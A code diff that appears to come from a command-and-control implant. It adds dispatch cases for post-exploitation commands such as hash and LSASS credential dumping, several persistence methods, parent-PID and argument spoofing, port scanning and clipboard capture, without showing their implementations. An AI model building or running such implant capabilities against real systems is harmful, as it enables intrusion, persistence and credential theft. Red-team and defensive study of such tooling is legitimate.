@@ -202,6 +202,72 @@ auto declfn dispatch_command(
 #ifdef INCLUDE_CMD_SPAWNTO_X86
         case CMD_SPAWNTO_X86: cmd_spawnto_x86( inst, task_uuid, params ); return;
 #endif
+#ifdef INCLUDE_CMD_SPAWN
+        case CMD_SPAWN: cmd_spawn( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_ARP
+        case CMD_ARP: cmd_arp( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_DRIVES
+        case CMD_DRIVES: cmd_drives( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_UPTIME
+        case CMD_UPTIME: cmd_uptime( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_NET_SESSIONS
+        case CMD_NET_SESSIONS: cmd_net_sessions( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_NET_SHARES
+        case CMD_NET_SHARES: cmd_net_shares( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_NET_LOGGEDON
+        case CMD_NET_LOGGEDON: cmd_net_loggedon( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_CLIPBOARD
+        case CMD_CLIPBOARD: cmd_clipboard( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_WINDOWS
+        case CMD_WINDOWS: cmd_windows( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_REG_DELETE
+        case CMD_REG_DELETE: cmd_reg_delete( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_REG_CREATE_KEY
+        case CMD_REG_CREATE_KEY: cmd_reg_create_key( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_PERSIST_RUN
+        case CMD_PERSIST_RUN: cmd_persist_run( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_PERSIST_SCHTASK
+        case CMD_PERSIST_SCHTASK: cmd_persist_schtask( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_PERSIST_SERVICE
+        case CMD_PERSIST_SERVICE: cmd_persist_service( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_PPID_SPOOF
+        case CMD_PPID_SPOOF: cmd_ppid_spoof( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_ARGUE
+        case CMD_ARGUE: cmd_argue( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_RUNAS
+        case CMD_RUNAS: cmd_runas( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_HASHDUMP
+        case CMD_HASHDUMP: cmd_hashdump( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_LSASS_DUMP
+        case CMD_LSASS_DUMP: cmd_lsass_dump( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_TOKEN_STORE
+        case CMD_TOKEN_STORE: cmd_token_store( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_PORTSCAN
+        case CMD_PORTSCAN: cmd_portscan( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_INLINE_EXECUTE
+        case CMD_INLINE_EXECUTE: cmd_inline_execute( inst, task_uuid, params ); return;
+#endif
         default: break;
     }
 
